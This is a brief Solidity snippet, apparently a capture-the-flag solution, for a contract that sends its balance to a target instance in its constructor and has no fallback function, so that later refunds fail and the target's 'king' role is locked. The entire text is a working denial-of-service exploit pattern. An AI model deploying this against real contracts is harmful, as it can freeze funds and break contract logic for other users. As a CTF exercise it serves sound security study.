Using a contract to make the call with a constructor that takes the instance address during deployment
Because there is no fallback function, the contract fails.

pragma solidity ^0.4.18;

contract CrownMeForever {
    
    constructor(address _instance) payable public {
        _instance.call.gas(100000000).value(address(this).balance)();
        
    }
}
